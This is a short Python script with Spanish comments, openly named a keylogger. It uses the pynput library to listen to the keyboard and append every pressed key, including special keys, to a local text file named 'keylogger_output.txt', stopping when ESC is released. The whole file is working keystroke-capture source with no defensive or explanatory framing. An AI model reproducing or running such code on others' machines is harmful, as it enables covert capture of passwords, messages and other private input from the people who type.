from pathlib import Path
from pynput import keyboard

# Archivo de salida
log_file = Path("keylogger_output.txt")

# Crear archivo si no existe
log_file.touch(exist_ok=True)

def on_press(key):
    try:
        log_file.write_text(log_file.read_text() + key.char)
    except AttributeError:
        log_file.write_text(log_file.read_text() + f"[{key}]")

# Salir con ESC
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Listener de las teclas
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
